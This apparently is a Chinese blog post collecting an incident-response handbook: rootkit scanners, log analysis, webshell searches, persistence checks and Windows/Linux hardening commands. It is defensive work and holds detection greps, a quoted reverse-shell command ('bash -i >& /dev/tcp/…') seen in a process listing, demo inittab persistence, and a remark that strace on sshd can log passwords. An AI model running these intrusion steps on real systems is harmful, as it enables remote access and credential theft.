---
layout: post
title:  "信安应急响应手册"
date:   2018-6-25 12:56:18 +0800
categories: pentest
category: pentest
---
<p>
	<span style="color:#DAA520;"><strong>在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。</strong></span>
</p>

### 应急工具包

#### Tools for windows

* Logparser
* wireshark
* WSExplorer
* 冰刃
* process explorer
* winsyscheck
* PC Hunter(xuetr) 可查看硬盘上隐藏的文件
* D盾/360网站卫士/安全狗
* Filemon：查看进程和文件对应
* Regmon：查看进程和注册表对应
* Rootkit Unhooker：Hook检测
* Rootkit Revelaer：rootkit检测
* LP_Check工具检查: 找出影子管理员和克隆账号
* Autoruns工具： 查看启动项
* bitsadmin /list/allusers/verbose【好像不大好使】

#### Tools for linux

* chkrookit
* rkhunter
* tshark
* shellpub(河马)
* Auditd【linux自带审计】

简单用法：

1、chkrootkit

```
下载：wget –c ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
编译：tar xvzf chkrootkit.tar.gz
make sense
开始检测：./chkrootkit -q
如果出现INFECTED，说明检测出系统后门
可以直接使用./chkrootkit -q | grep INFECTED命令检测并筛选出存在INFECTED的内容
```

2、Rootkit Hunter

```
安装Rootkit Hunter：
tar xvzf rkhunter-xx.tar.gz
cd rkhunter-xx
./install.sh --layout default --install
开始检测：
rkhunter -check
```

3、强大的日志分析工具Log Parser
#分析IIS日志

```
LogParser.exe "select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log" -o:datagrid
```

有了这些我们就可以对windows日志进行分析了。

比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：

```
LogParser.exe -i:EVT "SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,'|') AS USERNAME,EXTRACT\_TOKEN(Strings,2,'|') AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,'|') AS Client_IP FROM 'e:\logparser\xx.evtx' WHERE EventID=675"
```



#### 样本分析平台

* VirusTotal（简称VT，https://www.virustotal.com/）
* 国内的微步在线（https://x.threatbook.cn/）
* 腾讯的哈勃系统（https://habo.qq.com/）
* 金山的火眼（https://fireeye.ijinshan.com/）
* 安全易【日志分析】（https://www.anquanyi.com/）
* http://www.virscan.org 多引擎可疑文件扫描
* https://ti.360.net/ 360威胁情报中心


#### 日志相关

日志文件位置：

```
Apache日志位置配置在httpd.conf中。
IIS日志默认存放在%systemroot%\system32\LogFiles\W3SVC目录，如果没有，可以通过配置文件查找，WEB站点—属性—网站—W3C扩展日志文件格式—属性—日志文件目录
apache日志 /usr/local/apache/logs/access_log
weblogic日志 \your_domain\servers\AdminServer\logs\asscee_log
root命令记录 /root/.bash_history
普通用户命令记录：/home/普通用户/.bash_history
/var/log/messages 包括整体系统信息 系统启动期间的日志
/var/log/boot.log 包含系统启动的日志
/var/log/secure SSHD会将所有信息记录（包括失败记录）
/var/log/btmp 记录所有用户的最近信息
/var/log/*
```


### 应急命令集

#### cmd for windows

```
netstat -b -n【查看目前的网络连接情况】
netstat -ano
tasklist | findstr xxx
taskkill /T /F /PID PID号

知道是上传目录，在web log中查看指定时间范围包括上传文件夹的访问请求
findstr /s /m /I "UploadFiles" *.log
某次博彩事件中的六合彩信息是six.js
findstr /s /m /I "six.js" *.aspx
根据shell名关键字去搜索D盘spy相关的文件有哪些
for /r d:\ %i in (*spy*.aspx) do @echo %i

来查看创建时间：
dir /tc 1.aspx

查看用户recent相关文件，通过分析最近打开分析可疑文件

a) C:\Documents and Settings\Administrator\Recent
b) C:\Documents and Settings\Default User\Recent
c) 开始,运行 %UserProfile%\Recent
```

#### cmd for linux

```
netstat  -antpl
lsof -p PID号
cd /proc/pidnumber
ls -ail
rm –rf /proc/pidnumber/恶意程序

curl ip.cn -H "X-Forwarded-For: x.x.x.x"
ps -ef、lsof -i:8080、netstat -lanp

stat -- 获取比 ls 更多的信息

部分敏感命令：
users:显示当前登陆用户信息。
Who:显示谁正在使用系统本地节点的信息。
Last:显示系统曾经被登陆的用户和TTYS。
w:查看谁登陆到系统中，且在做什么操作。 
netstat -anp:查看端口对应的进程关系。
lsof -p PID:查看进程对应的文件，配合netstat -anp查看端口进程文件之间的关系，可以找到可以端口进程对应的文件。
lsof -i:查看实时的进程、服务与端口信息。
ps -aux:查看进程。
chkconfig -list:查看服务启动信息。
find / -perm -004000 -type f:输出所有设置了SUID的文件。
rpm -Va:列举全部软件包的变化情况。


lsof命令用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为lsof命令需要访问核心内存和各种文件，所以需要root用户执行。
lsof -i:8080【进程号】

【ls实现列文件按时间排序】
1) ls -lt  时间最近的在前面
2) ls -ltr 时间从前到后
3) 利用sort
ls -l | sort +7 (日期为第8列)  时间从前到后
ls -l | sort -r +7 时间最近的在前面

【Strace动态调试】
strace -p PID

strace -o aa -ff -p ssh进程
grep open aa* | grep -v -e No -e null -e denied| grep WR
grep一下open系统调用，然后过滤掉错误信息和/dev/null信息，以及denied信息，并且找WR的
另外，这玩意儿可以当后门记录密码
---------------

查找shell：
find /var/www/html/ -type f -name "*.jsp" | xargs grep "exec("
find /site/* -type f -name "*.php" |xargs grep "eval(" 　
find /site/* -type f -name "*.asp" |xargs grep "execute("
find /site/* -type f -name "*.aspx" |xargs grep "eval("
如果木马做了免杀处理，可以查看是否使用加密函数
find /site/* -type f -name "*.php" |xargs grep "base64_decode"
find /site/* -type f -name "*.php" |xargs grep "@$"

新增文件分析
例如要查找24小时内被修改的JSP文件： 
find ./ -mtime 0 -name "*.jsp"
（最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）

查找72小时内新增的文件find / -ctime -2
PS：-ctime 内容未改变权限改变时候也可以查出
根据确定时间去反推变更的文件
ls -al /tmp | grep "Feb 27"

特殊权限的文件
查找777的权限的文件 find / *.jsp -perm 4777
---------------

查看可疑账号：

查看UID为0的帐号：awk -F: '{if($3==0)print $1}' /etc/passwd
查看能够登录的帐号：cat /etc/passwd | grep -E "/bin/bash$"
PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）

-----------------

查找日志：
1、注入漏洞记录
grep -i select%20 *.log  | grep 500 | grep -i \.php 
查找后缀为".log"文件，搜索关键字为"select%20",筛选存在"500"的行
grep -i sqlmap *.log
sqlmap默认User-Agent是sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)，查看存在sqlmap的行，可以发现sqlmap拖库的痕迹。

2、跨站漏洞记录
grep -i "script" *.log 查找存在script的行。

3、扫描器扫描
grep -i acunetix *.log AWVS扫描时，会发送大量含有"acunetix"的数据包

4、搜索特定时间的日志
grep \[07/Jul/2016:24:00:* *.log 可以结合入侵时间搜索，文件修改时间不可作为依据，菜刀上就可以修改文件时间属性。

5、搜索特定IP地址的日志
grep ^192.168.1.* *.log 搜索包含"192.168.1."字符串开头的行 
grep -v ^192.168.10.* *.log 不搜索包含"192.168.10."字符串开头的行 
可以结合网站、网络安全策略搜索能访问网站后台、FTP服务等的IP地址。
查看ip访问次数：
cat access.log | awk '{print $1}' | sort | uniq -c
cat /var/log/secure |grep ACCEPTED 查看ssh进入的ip

页面访问排名前十的IP
cat access.log | cut -f1 -d " " | sort | uniq -c | sort -k 1 -r | head -10
页面访问排名前十的URL
cat access.log | cut -f4 -d " " | sort | uniq -c | sort -k 1 -r | head -10
查看最耗时的页面
cat access.log | sort -k 2 -n -r | head 10
---------------

查看所有用户的定时任务：
for u in `cat /etc/passwd | cut -d":" -f1`;do crontab -l -u $u;done

netstat –tlp –ano | grep 'ip'



敏感文件：
/var/log/messages:记录整体系统信息，其中也记录某个用户切换到root权限的日志。 
/var/log/secure:记录验证和授权方面信息。例如sshd会将所有信息记录（其中包括失败登录）在这里。
/var/log/lastlog:记录所有用户的最近信息。二进制文件，因此需要用lastlog命令查看内容。
/var/log/btmp:记录所有失败登录信息。使用last命令可查看btmp文件。例如"last -f /var/log/btmp | more"。
/var/log/maillog:记录来着系统运行电子邮件服务器的日志信息。例如sendmail日志信息就送到这个文件中。
/var/log/mail/:记录包含邮件服务器的额外日志。
/var/log/wtmp或/var/log/utmp:记录登录信息。二进制文件，须用last来读取内容;
/etc/passwd:记录用户信息，查看是否存在可疑账号。
/etc/shadow:记录用户密码，查看是否存在可疑账号。
.bash_history:shell日志，查看之前使用过的命令。
/var/log/cron:记录计划任务。


grep evil_ip /var/log/secure*【查看last记录里的可疑ip】
grep "Accept" /var/log/secure* | awk '{print $11}' | sort | uniq【查看所有登录成功的ip】

检查常用命令是否被替换：
[root[@ceshi1](/user/ceshi1) log]# ls -alt /bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/sbin/ | head -n 10

查看.sshd里面的ip：
strings /usr/bin/.sshd | egrep '[1-9]{1,3}\.[1-9]{1,3}\.'

发现可疑进程，查看所在途径【随时准备拷贝自用的bin文件，比如ps】：
netstat -antlp
ps axu | grep xxx| grep -v grep

pstree -p【感觉完全没有win下叼啊】

查看一些临时目录

例如要查找24小时内被修改的JSP文件：
find ./ -mtime 0 -name "*.jsp"

find ./ -mtime 2
搜索是的48~72小时内修改的文件。

find . –mtime +n:
最后一次修改发生在n+1天以前，距离当前时间为(n+1)*24小时或者更早

find . –mtime –n:
最后一次修改发生在n天以内，距离当前时间为n*24小时以内

查找24小时内被修改的JSP文件也可以用：
find ./ -mtime -1 -name "*.jsp"

--------------
echo $PATH 分析有无敏感可疑信息
a) strings命令在对象文件或二进制文件中查找可打印的字符串
b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep '[1-9]{1,3}.[1-9]{1,3}.'
PS：此正则不严谨，但匹配IP已够用
c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称）
查看ssh相关目录有无可疑的公钥存在。
a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。
b) 目录： /etc/ssh ./.ssh/
--------------------------



查看访问控制文件权限：
setfacl与getfacl

lsattr和chattr
修改属性能够提高系统的安全 性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录
例子：设置/etc/resolv.conf为不可修改
[root@vincent tmp]# chattr +i /etc/resolv.conf 
[root@vincent tmp]# lsattr /etc/resolv.conf 
----i--------e- /etc/resolv.conf
[root@vincent tmp]# echo "" > /etc/resolv.conf 
-bash: /etc/resolv.conf: 权限不够
lsattr
查看文件权限
[root@vincent tmp]# lsattr 1.txt 
-----a-------e- 1.txt


【获取反弹bash】
netstat -antlp | grep EST | grep bash
【检查在监听的端口】
netstat -antlp | grep LISTEN

【查找敏感目录/tmp, /var/tmp, /dev/shm】
# ls -ald xxx

默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。
之前写的关于Bash审计方式也很推荐。从Bash4.1 版本开始，Bash开始支持Rsyslog.

find ./ -mtime 0 -name "*.jsp" 【找webshell】
diff -r {生产dir} {测试dir}



启动项排查：
【总结一下，针对CentOS5系统，需要排查的点】：
1）/etc/inittab
该文件是可以运行process的，这里我们添加一行
> 0:235:once:/bin/vinc
内容如下
[root@localhost ~]# cat /bin/vinc 
#!/bin/bash
cat /etc/issue > /tmp/version
重启
[root@localhost ~]# cat /tmp/version 
CentOS release 5.5 (Final)
Kernel \r on an \m
2）/etc/rc.d/rc.sysinit
在最后插入一行/bin/vinc
[root@localhost ~]# ll /tmp/version 
-rw-r--r-- 1 root root 47 11-05 10:10 /tmp/version
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local
【总结一下，针对CentOS6系统，需要排查的点】：
1）/etc/init/*.conf
vim tty.conf，添加一行
> exec /bin/vinc
内容如下:
[root@vincenthostname init]# cat /bin/vinc 
#!/bin/bash

touch /tmp/vinc
重启
[root@vincenthostname ~]# ll /tmp/vinc
-rw-r--r-- 1 root root 0 6月  22 15:07 /tmp/vinc
2）/etc/rc.d/rc.sysinit
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local

定时部分：
应急响应中关于定时任务应该排查的/etc/crontab,/etc/cron.d,/var/spool/cron/{user},然后顺藤摸瓜去看其他调用的目录/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly，/etc/anacrontab 。
其中容易忽视的就是/etc/anacrontab

这里就需要介绍一些/usr/sbin/anacron，anacron是干什么的？
anacron主要在处理非 24 小时一直启动的 Linux 系统的 crontab 的运行。

ll /var/spool/cron/*
------------

检查命令替换部分：
1）系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查。
例如我替换一下/bin/ps，然后使用rpm -qaV查看
[root@vincenthostname tmp]# rpm -qa /bin/ps
2）比对命令的大小
例如正常的ps和netstat大小
[root@vincent tmp]# ll /bin/ps
-rwxr-xr-x 1 root root 87112 11月 15 2012 /bin/ps
[root@vincent tmp]# ll /bin/netstat
-rwxr-xr-x 1 root root 128216 5月 10 2012 /bin/netstat
下面是其中有一次应急时的记录
[root@DataNode110 admin]# ls -alt /bin/ | head -n 10
total 10836
-rwxr-xr-x 1 root root 625633 Aug 17 16:26 tawlqkazpu
dr-xr-xr-x. 2 root root 4096 Aug 17 16:26 .
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 ps
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 netstat
可以看到ps和netstat是一样大的。
3）查看命令的修改时间，按修改时间排序
ls -alt /bin/ | head -n 5
4）使用chkrootkit和rkhunter查看
chkrootkit
1、准备gcc编译环境
对于CentOS系统，执行下述三条命令：
> yum -y install gcc gcc-c++ make glibc*
2、下载chkrootkit源码
chkrootkit的官方网站为 http://www.chkrootkit.org ，下述下载地址为官方地址。为了安全起见，务必在官方下载此程序：
> [root@www ~]# wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
3、解压下载回来的安装包
> [root@www ~]# tar zxf chkrootkit.tar.gz
4、编译安装（后文命令中出现的"*"无需替换成具体字符，原样复制执行即可）
>[root@www ~]# cd chkrootkit-*
>
>[root@www ~]# make sense
注意，上面的编译命令为make sense。
5、把编译好的文件部署到/usr/local/目录中，并删除遗留的文件
>[root@www ~]# cd ..
>[root@www ~]# cp -r chkrootkit- /usr/local/chkrootkit
>[root@www ~]# rm -r chkrootkit-
至此，安装完毕。
使用方法
安装好的chkrootkit程序位于 /usr/local/chkrootkit/chkrootkit
直接执行
> root@vm:~# /usr/local/chkrootkit/chkrootkit
rkhunter
在安装了kbeast的系统上测试，发现检测效果不如rkhunter好。
下载地址： http://sourceforge.net/projects/rkhunter/files/
1）安装
tar -xvf rkhunter-1.4.0.tar.gz
cd rkhunter-1.4.0
./installer.sh –install
在安装了kbeast的系统上测试，可以成功检测到。
/usr/local/bin/rkhunter –check -sk
[19:50:27] Rootkit checks…
[19:50:27] Rootkits checked : 389
[19:50:27] Possible rootkits: 1
[19:50:27] Rootkit names : KBeast Rootkit
2）在线升级
rkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:
执行命令：
> rkhunter –update
3）检测最新版本
让 rkhunter 保持在最新的版本；
执行命令：
> rkhunter –versioncheck


【创建Audit审计规则】
vim /etc/audit/audit.rules
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell

【编写测试Java命令监控规则，Jboss的启动账户为nobody，添加审计规则】
# grep '\-a' /etc/audit/audit.rules 
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b32 -F uid=99 -S execve -k webshell
【重启服务】
# service auditd restart
Stopping auditd: [ OK ]
Starting auditd: [ OK ]

查看恶意ip试图登录次数：
lastb | awk '{ print $3}'  | sort | uniq -c | sort -n

SSH部分：
【查看登录成功信息】
grep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者last命令，它会读取位于/var/log/wtmp的文件

【查看登录失败信息】
grep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者lastb命令，会读取位于/var/log/btmp的文件

【查看ssh配置文件和/usr/sbin/sshd的时间】
stat /usr/sbin/sshd

【通过strace监控sshd进程读写（密码）文件的操作】
# ps axu | grep sshd | grep -v grep
root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd
# strace -o aa -ff -p 65530
# grep open aa* | grep -v -e No -e null -e denied| grep WR
aa.102586:open("/tmp/ilog", O_WRONLY|O_CREAT|O_APPEND, 0666) = 4

进程部分：
【资源占用】
top
【启动时间】
可疑与前面找到的Webshell时间点比对。
【启动权限】
这点很重要，比如某次应急中发现木马进程都是mysql权限执行的，如下所示：
mysql 63763 45.3 0.0 12284 9616 ? R 01:18 470:54 ./db_temp/dazui.4
mysql 63765 0.0 0.0 12284 9616 ? S 01:18 0:01 ./db_temp/dazui.4
mysql 63766 0.0 0.0 12284 9616 ? S 01:18 0:37 ./db_temp/dazui.4
mysql 64100 45.2 0.0 12284 9616 ? R 01:20 469:07 ./db_temp/dazui.4
mysql 64101 0.0 0.0 12284 9616 ? S 01:20 0:01 ./db_temp/dazui.4
那基本可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。
【父进程】
例如我在菜刀中反弹Bash
[root@server120 html]# ps -ef | grep '/dev/tcp' | grep -v grep
apache 26641 1014 0 14:59 ? 00:00:00 sh -c /bin/sh -c "cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i >& /dev/tcp/192.168.192.144/2345 0>&1;echo [S];pwd;echo [E]" 2>&1
父进程进程号1014
[root@server120 html]# ps -ef | grep 1014
apache 1014 1011 0 Sep19 ? 00:00:00 /usr/sbin/httpd
可以看到父进程为apache，就可以判断攻击者通过Web入侵。
获取到可疑进程号之后，可疑使用lsof -p pid查看相关文件和路径。
例如之前遇到的十字病毒，会修改ps和netstat显示的进程名称
udp 0 0 0.0.0.0:49937 0.0.0.0:* 131683/ls -la 
udp 0 0 0.0.0.0:47584 0.0.0.0:* 116515/ifconfig
使用lsof -p pid可以看到可执行文件
[root@DataNode105 admin]# lsof -p 131683
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
hahidjqzx 131683 root cwd DIR 8,98 4096 18087937 /root
hahidjqzx 131683 root rtd DIR 8,98 4096 2 /
hahidjqzx 131683 root txt REG 8,98 625622 24123895 /usr/bin/hahidjqzxs
【获取文件类型】
可以文件类型可以使用file获取；


awk '{print $1}' access.log |sort|uniq -c|sort -nr|head -10【获取频率前10的ip】
netstat -nat | grep "192.168.1.15:1234" |awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -20【查看连接某服务端口最多的的IP地址】


```

#### 安全加固

##### 常规应急处理

杀死进程，kill -9 xxx
删除木马，拷贝正常命令【或者找原来的备份】，删除开机启动项。


```
[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
rm: cannot remove `abcfg': Operation not permitted
[root[@ceshi1](/user/ceshi1) tomcat]# lsattr abcfg
----i--------e- abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# chattr -i abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
--------------------
```

屏蔽IP

```
iptables -A INPUT -i eth0 -s *.*.*.0/24 -j DROP
```


##### WINDOWS系统篇


```
1.1.1 禁用/停止服务
C:> sc query
C:> sc config "服务名" start= disabled
C:> sc stop "服务名"
C:> wmic service where name="服务名" call ChangeStartmode Disabled
1.1.2 防火墙管理
列出所有规则:
C:> netsh advfirewall firewall show rule name=all
启用或禁用防火墙:
C:> netsh advfirewall set currentprofile state on
C:> netsh advfirewall set currentprofile firewallpolicy blockinboundalways,allowoutbound
C:> netsh advfirewall set publicprofile state on
C:> netsh advfirewall set privateprofile state on
C:> netsh advfirewall set domainprofile state on
C:> netsh advfirewall set allprofile state on
C:> netsh advfirewall set allprof ile state off
配置举例：
netsh advfirewall firewall add rule name="开放TCP:80端口" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="开放TCP:443端口" dir=in action=allow protocol=TCP localport=443
netsh advfirewall firewall add rule name="屏蔽TCP:445端口" dir=in action=block protocol=TCP localport=445
netsh advfirewall firewall add rule name="允许MyApp" dir=in action=allow program="C:MyAppMyApp.exe" enable=yes
1.1.3 清除DNS缓存和Netios缓存
C:> ipconfig /flushdns
C:> nbtstat -R
1.1.4 应用控制
AppLocker配置
导入Applocker模块
PS C:> import-module Applocker
查看system32目录下所有exe文件的Applocker信息
PS C:> Get-ApplockerFileinformation -Directory C:WindowsSystem32 -Recurse -FileType Exe
 增加一条针对system32目录下所有的exe文件的允许规则
PS C:> Get-Childitem C:WindowsSystem32*,exe | Get-ApplockerFileinformation | New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32
1.1.5 IPSEC
1.）使用预共享密钥的方式新建一条IPSEC本地安全策略，应用到所有连接和协议
C:> netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY
C:> netsh ipsec static add filteraction name=MyIPsecAction action=negotiate 
C:> netsh ipsec static add policy name=MyIPsecPolicy assign=yes
C:> netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all  activate=yes psk=密码
2.）新建一条允许访问外网TCP 80和443端口的IPSEC策略
C:> netsh ipsec static add filteraction name=Allow action=permit
C:> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=80
C:> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=443
C:> netsh ipsec static add rule name=WebAllow policy=MyIPsecPolicy filterlist=WebFilter filteraction=Allow conntype=all activate=yes psk=密码
3.）查看和禁用某条IPSEC本地安全策略
C:> netsh ipsec static show policy name=MyIPsecPolicy
C:> netsh ipsec static set policy name=MyIPsecPolicy assign=no
新建一条IPSEC对应的防火墙规则，源地址和目的地址为any
C:> netsh advfirewall consec add rule name="IPSEC" endpointl=any endpoint2=any action=requireinrequireout qmsecmethods=default
新建一条IPSEC对应的防火墙规则，所有出站请求必须提供预共享密钥
C:> netsh advfirewall firewall add rule name="IPSEC_Out" dir=out action=allow enable=yes profile=any localip=any remoteip=any protocol=any  interfacetype=any security=authenticate
1.1.6 其他安全策略
禁用远程桌面连接
C:> reg add "HKLMSYSTEMCurrentControlSetControlTerminalServer" /f /v fDenyTSConnections /t REG_DWORD /d 1
只发送NTLMv2响应（防止"永恒之蓝"漏洞攻击）
C:> reg add HKLMSYSTEMCurrentControlSetControlLsa /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
禁用IPV6
C:> reg add HKLMSYSTEMCurrentControlSetservicesTCPIP6Parameters /v DisabledComponents /t REG_DWORD /d 255 /f
禁用sticky键
C:> reg add "HKCUControlPanelAccessibilityStickyKeys" /v Flags /t REG_SZ /d 506 /f
禁用管理共享（Servers/Workstations）
C:> reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareServer /t REG_DWORD /d 0
C:> reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareWks /t REG_DWORD /d 0
禁用注册表编辑器和CMD命令提示符
C:> reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableRegistryTools /t REG_DWORD /d 1 /f
C:> reg add HKCUSoftwarePoliciesMicrosoftWindowsSystem /v DisableCMD /t REG_DWORD /d 1 /f
启用UAC
C:> reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem /v EnableLUA /t REG_DWORD /d 1 /f
启用防火墙日志
C:> netsh firewall set logging droppedpackets = enable 
C:> netsh firewall set logging connections = enable
```

##### LINUX系统篇


```
1.2.1 服务管理
查看服务状态
service --status-all
ps -ef OR ps -aux
initctl list
systemctl list-unit-files
启动，停止和禁用服务
For Upstart services:
/etc/init.d/apache2 start | stop | status
service apache2 start | stop | status
update-rc.d apache2 disable
For Systemd services:
systemctl start | stop | status ntp.service
systemctl disable sshd.service
1.2.2 防火墙管理
iptables 常用操作：
iptables-save > filewall_rules.bak # 导出当前规则
iptables -vnL --line # 列出所有规则
iptables -S # 同上
iptables -P INPUT DROP # 默认策略，禁止所有连接
iptables -A INPUT -s 10.10.10.10 -j DROP # 禁止单个IP
iptables -A INPUT -s 10,10.10.0/24 -j DROP # 禁止一个网段
iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP # 禁止某IP访问本机SSH服务
iptables -A INPUT -p tcp --dport ssh -j DROP # 禁止访问本机SSH服务
iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix "
iptables denied: " --log-level 7 # 启用日志
iptables -F # 清除所有已加载的工作
1.2.3 DNS缓存
Unix/Linux系统没有系统级别DNS缓存
1.2.4 配置IPSEC
在两台服务器之间建立IPSEC通道
1.）添加防火墙规则允许IPSEC协议
iptables -A INPUT -p esp -j ACCEPT
iptables -A INPUT -p ah -j ACCEPT
iptables -A INPUT -p udp --dport 500 -j ACCEPT
iptables -A INPUT -p udp --dport 4500 -j ACCEPT
安装Racoon
apt -y install racoon
2.）编辑配置文件：/etc/ipsec-tools.conf
flush;
spdflush;
spdadd 主机A的IP地址 主机B的IP地址 any -P out ipsec
 esp/transport//require;
spdadd 主机B的IP地址 主机A的IP地址 any -P in ipsec
 esp/transport//require;
3.）编辑配置文件：/etc/racoon/racoon.conf
log notify;
path pre_shared_key "/etc/racoon/psk.txt";
path certificate "/etc/racoon/certs";
remote anonymous {
 exchange_mode main,aggressive;proposal {    encryption_algorithm aes_256;    hash_algorithm sha256;    authentication_method
pre_shared_key;
     dh_group modp1024;
}
 generate_policy off;
}
sainfo anonymous{
 pfs_group 2;encryption_algorithm aes_256;authentication_algorithm hmac_sha256;compression_algorithm deflate;
}   
4.）添加预共享密钥
主机A：echo 主机B 123 >> /etc/racoon/psk.txt
主机B：echo 主机A 123 >> /etc/racoon/psk.txt
5.）重启服务，检查协商及配置策略
service setkey restart
setkey -D
setkey -DP
```

#### 给目录和容器改权限

[apache禁止访问文件或目录执行权限、禁止运行脚本PHP文件的设置方法](https://www.cnblogs.com/yuanqiao/p/4816843.html)

[Tomcat用户权限设置](https://blog.csdn.net/anxinliu2011/article/details/)


在ubuntu 安装完apache 之后，默认会往系统中增加www-data 用户 和 www-data 用户组。
同样你可以用 ps -ef | grep apache 查看 apache 进程，你会发现apache的。

这样你就可以理解为这个apache服务器运行的用户和用户组是www-data,假设网站的用户为demo,项目的目录为/var/www/html/demo

接下来就分几个步骤来设置(用root用户执行下面的命令)：


```
1.首先把网站的的目录和文件的所有者设置为demo,所属组设置为www-data ，对与Linux命令不熟悉的，可以到网上查询。

chown -R demo:www-data /var/www/html/demo
2.设置网站目录权限为750，750是demo这个用户对目录拥有读写执行的权限，这样demo用户可以在任何目录下创建文件，用户组有有读执行权限，这样就有进入目录的权限，其它用户没有任何权限。

chmod 750 /var/www/html/demo
cd  /var/www/html/demo
find -type d -exec chmod 750 {} \;
3.设置网站文件权限为640，640指只有demo用户对网站文件有更改的权限，apache服务器只有读取文件的权限，无法更改文件，其它用户无任何权限。

find -not -type d -exec chmod 640 {} \;
4.需要针对个别目录来设置权限，以Thinkphp为例，它的Runtime 目录存储的有日志文件，还有与数据库做ORM映射的数据库表信息，这说明apache服务器要对这些目录

有访问的权限，并且对于线面的日志文件有写入的权限，那么这样就需要对于这些特殊目录设置。

cd /var/www/html/demo
find . -name "Runtime" -type d -exec chmod -R 770 {} \;
执行上面的命令请注意 “{}”与 “\”之间是有空格的，上面的-R参数是递归给Runtime 目录下面的目录和文件赋予 770 权限，当然了你会说日志文件是不需要执行权限的，

不过这里没关系，当你把日志文件删除掉之后，生成出来的文件是没执行权限的。因为当你把日志文件删除掉之后，那么生成日志文件的的用户和所有者都是www-data。

这样整个站点你就可以通过这种方式管理起来了。
```



#### 简单的抓包命令

抓取所有经过 eth2 目的或源地址是 192.168.1.2 的网络数据 ，并且保存到XX.pcap文件中
```
tcpdump   -i  eth2 host 192.168.1.2    -w   xx.pcap
```

抓取所有经过 eth2，目的地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中
```
tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
```

抓取所有经过 eth1，源地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中
```
tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
```

抓取网口1 源端口是25的数据，保存到xx.pcap中
```
# tcpdump -i eth1 src port 25  -w   xx.pcap
```

抓取网口1 目的端口是25的数据，保存到xx.pcap中
```
# tcpdump -i eth1 dst port 25  -w   xx.pcap
```

抓整个包：

```
#tcpdump -X -s 0 host 192.168.1.12
```

抓68字节：

```
#tcpdump -X host 192.168.1.12
```
对应的端口抓包：

```
#tcpdump -X udp port 1812
```

wireshak工具抓包：

```
wireshak工具抓包
tcp.port == 6789

过滤源ip、目的ip。在wireshark的过滤规则框Filter中输入过滤条件。如查找目的地址为192.168.101.8的包，ip.dst==192.168.101.8；查找源地址为ip.src==1.1.1.1；

使用wireshark常用的过滤命令
